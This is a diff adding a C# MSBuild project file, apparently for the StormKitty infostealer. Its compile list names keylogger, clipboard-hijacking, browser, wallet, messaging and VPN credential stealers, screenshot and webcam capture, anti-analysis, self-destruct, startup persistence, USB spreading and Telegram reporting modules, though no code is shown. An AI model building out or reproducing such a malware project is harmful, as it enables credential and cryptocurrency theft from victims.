@@ -1,0 +1,148 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">x86</Platform>
+    <ProjectGuid>{FCF8936E-644D-4E49-ADAA-12D982BCEB27}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>stub</RootNamespace>
+    <AssemblyName>stub</AssemblyName>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <ApplicationIcon>stub.ico</ApplicationIcon>
+    <StartupObject>StormKitty.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="DotNetZip">
+      <HintPath>DotNetZip.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Clipper\Clipboard.cs" />
+    <Compile Include="Clipper\Clipper.cs" />
+    <Compile Include="Clipper\EventManager.cs" />
+    <Compile Include="Clipper\RegexPatterns.cs" />
+    <Compile Include="Keylogger\EventManager.cs" />
+    <Compile Include="Keylogger\Keylogger.cs" />
+    <Compile Include="Keylogger\PornDetection.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Stealer\ActiveWindows.cs" />
+    <Compile Include="Stealer\AutoFill.cs" />
+    <Compile Include="Stealer\Banking.cs" />
+    <Compile Include="Stealer\Bookmark.cs" />
+    <Compile Include="Stealer\cAesGcm.cs" />
+    <Compile Include="Stealer\cBCrypt.cs" />
+    <Compile Include="Stealer\cBrowserUtils.cs" />
+    <Compile Include="Stealer\Chromium\Autofill.cs" />
+    <Compile Include="Stealer\Chromium\Bookmarks.cs" />
+    <Compile Include="Stealer\Chromium\Cookies.cs" />
+    <Compile Include="Stealer\Chromium\CreditCards.cs" />
+    <Compile Include="Stealer\Chromium\Crypto.cs" />
+    <Compile Include="Stealer\Chromium\Downloads.cs" />
+    <Compile Include="Stealer\Chromium\History.cs" />
+    <Compile Include="Stealer\Chromium\Parser.cs" />
+    <Compile Include="Stealer\Chromium\Passwords.cs" />
+    <Compile Include="Stealer\Chromium\Recovery.cs" />
+    <Compile Include="Stealer\Cookie.cs" />
+    <Compile Include="Stealer\Counter.cs" />
+    <Compile Include="Stealer\CreditCard.cs" />
+    <Compile Include="Stealer\DesktopScreenshot.cs" />
+    <Compile Include="Stealer\DirectoryTree.cs" />
+    <Compile Include="Stealer\Discord.cs" />
+    <Compile Include="Stealer\Edge\Autofill.cs" />
+    <Compile Include="Stealer\Edge\Bookmarks.cs" />
+    <Compile Include="Stealer\Edge\CreditCards.cs" />
+    <Compile Include="Stealer\Edge\Recovery.cs" />
+    <Compile Include="Stealer\FileGrabber.cs" />
+    <Compile Include="Stealer\FileZilla.cs" />
+    <Compile Include="Stealer\Firefox\cBookmarks.cs" />
+    <Compile Include="Stealer\Firefox\cCookies.cs" />
+    <Compile Include="Stealer\Firefox\cHistory.cs" />
+    <Compile Include="Stealer\Firefox\cLogins.cs" />
+    <Compile Include="Stealer\Firefox\Recovery.cs" />
+    <Compile Include="Stealer\InternetExplorer\cPasswords.cs" />
+    <Compile Include="Stealer\InternetExplorer\Recovery.cs" />
+    <Compile Include="Stealer\InternetExplorer\VaultCli.cs" />
+    <Compile Include="Stealer\Minecraft.cs" />
+    <Compile Include="Stealer\NordVPN.cs" />
+    <Compile Include="Stealer\OpenVPN.cs" />
+    <Compile Include="Stealer\Password.cs" />
+    <Compile Include="Stealer\Passwords.cs" />
+    <Compile Include="Stealer\Paths.cs" />
+    <Compile Include="Stealer\Pidgin.cs" />
+    <Compile Include="Stealer\ProcessList.cs" />
+    <Compile Include="Stealer\ProductKey.cs" />
+    <Compile Include="Stealer\ProtonVPN.cs" />
+    <Compile Include="Stealer\Report.cs" />
+    <Compile Include="Stealer\Site.cs" />
+    <Compile Include="Stealer\SQLite.cs" />
+    <Compile Include="Stealer\SqlReader.cs" />
+    <Compile Include="Stealer\Steam.cs" />
+    <Compile Include="Stealer\Telegram.cs" />
+    <Compile Include="Stealer\Uplay.cs" />
+    <Compile Include="Stealer\Wallets.cs" />
+    <Compile Include="Stealer\WebcamScreenshot.cs" />
+    <Compile Include="Stealer\Wifi.cs" />
+    <Compile Include="StormKitty\Bitcoin.cs" />
+    <Compile Include="StormKitty\CheckEth.cs" />
+    <Compile Include="StormKitty\CheckLTC.cs" />
+    <Compile Include="StormKitty\CheckXMR.cs" />
+    <Compile Include="StormKitty\ClipboardManager.cs" />
+    <Compile Include="StormKitty\CommandHelper.cs" />
+    <Compile Include="StormKitty\Config.cs" />
+    <Compile Include="StormKitty\Etherium.cs" />
+    <Compile Include="StormKitty\Filemanager.cs" />
+    <Compile Include="StormKitty\Flags.cs" />
+    <Compile Include="StormKitty\Implant\AntiAnalysis.cs" />
+    <Compile Include="StormKitty\Implant\MutexControl.cs" />
+    <Compile Include="StormKitty\Implant\SelfDestruct.cs" />
+    <Compile Include="StormKitty\Implant\StartDelay.cs" />
+    <Compile Include="StormKitty\Implant\Startup.cs" />
+    <Compile Include="StormKitty\Implant\StringsCrypt.cs" />
+    <Compile Include="StormKitty\Libs.cs" />
+    <Compile Include="StormKitty\LiteCoin.cs" />
+    <Compile Include="StormKitty\Monero.cs" />
+    <Compile Include="StormKitty\Program.cs" />
+    <Compile Include="StormKitty\SystemInfo.cs" />
+    <Compile Include="StormKitty\Telegram\Report.cs" />
+    <Compile Include="StormKitty\USBInstaller.cs" />
+    <Compile Include="StormKitty\WindowManager.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
